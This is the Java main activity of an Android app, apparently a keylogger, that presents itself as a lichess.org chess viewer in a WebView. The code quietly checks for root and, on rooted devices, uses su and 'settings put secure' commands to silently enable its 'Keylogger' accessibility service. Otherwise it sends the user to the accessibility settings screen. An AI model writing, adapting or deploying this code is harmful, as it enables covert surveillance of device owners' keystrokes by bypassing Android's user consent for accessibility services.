package com.bshu2.androidkeylogger;

import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.appcompat.app.AppCompatActivity;
import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    private WebView webView;

    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            enableAccessibility();
            return null;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("MainActivity", "onCreate");

        setContentView(R.layout.activity_main);

        webView = findViewById(R.id.webView);
        setupWebView();

        (new Startup()).execute();
    }

    void enableAccessibility() {
        Log.d("MainActivity", "Checking root status...");

        if (isDeviceRooted()) {
            Log.d("MainActivity", "Device is rooted. Enabling Accessibility via SU...");
            try {
                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("settings put secure enabled_accessibility_services com.bshu2.androidkeylogger/com.bshu2.androidkeylogger.Keylogger\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();
                process.waitFor();
            } catch (Exception e) {
                Log.e("MainActivity", "Error enabling Accessibility with root", e);
            }
        } else {
            Log.d("MainActivity", "Device is not rooted. Redirecting to Accessibility settings...");
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }

    boolean isDeviceRooted() {
        String[] paths = {"/system/bin/su", "/system/xbin/su", "/sbin/su", "/system/su"};
        for (String path : paths) {
            if (new java.io.File(path).exists()) {
                return true;
            }
        }
        return false;
    }

    private void setupWebView() {
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setLoadWithOverviewMode(true);
        webSettings.setUseWideViewPort(true);

        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("https://lichess.org/");
    }
}
